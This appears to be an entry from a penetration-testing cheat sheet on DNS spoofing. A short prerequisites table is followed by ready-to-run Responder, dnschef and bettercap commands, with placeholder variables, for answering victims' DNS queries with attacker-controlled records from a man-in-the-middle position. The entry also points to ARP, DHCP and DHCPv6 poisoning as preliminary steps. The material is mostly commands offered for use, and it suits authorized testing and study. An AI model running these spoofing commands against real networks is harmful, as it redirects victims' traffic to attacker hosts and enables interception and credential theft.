---
technique: DNSSpoofing
category: mitm
targets: DNS Clients
protocols: DNS, UDP, TCP
remote_capable: true
tags: mitm dns-spoofing responder dnschef bettercap ad
---

# DNSSpoofing

DNS spoofing requires receiving the victim's DNS queries through a MITM position, then answering with attacker-controlled records. Use ARP poisoning, DHCP poisoning, or DHCPv6 spoofing first when clients already use a legitimate unicast DNS server.

## Prerequisites

| Requirement | Detail |
|-------------|--------|
| Query visibility | The attacker must receive or reroute the victim's DNS traffic |
| Listening port | UDP/TCP 53 must be available on the attacker host |
| Target records | Choose specific hostnames or domains to avoid broad disruption |

## Linux

### Responder DNS server

#python #responder #dns

Start Responder with its DNS server enabled on the selected interface.

```sh title:"Start Responder DNS spoofing"
responder -I "$interface"
```
<!-- cheat
var interface
-->

### dnschef fake IP

#python #dnschef #dns

Answer DNS queries with a fake IP address using dnschef.

```sh title:"Start dnschef with fake DNS responses"
dnschef --fakeip "$lhost" --interface "$lhost" --port 53 --logfile dnschef.log
```
<!-- cheat
import tun_ip
-->

### bettercap DNS domain

#go #bettercap #dns

Set the domain pattern that bettercap should spoof.

```sh title:"Set bettercap DNS spoofing domain"
set dns.spoof.domains $domain_fqdn
```
<!-- cheat
var domain_fqdn
-->

### bettercap DNS all

#go #bettercap #dns

Enable bettercap DNS spoofing for all matching queries.

```sh title:"Enable bettercap DNS spoofing for all matches"
set dns.spoof.all true
```
<!-- cheat -->

### bettercap DNS start

#go #bettercap #dns

Start bettercap DNS spoofing after the domain options are configured.

```sh title:"Start bettercap DNS spoofing"
dns.spoof on
```
<!-- cheat -->
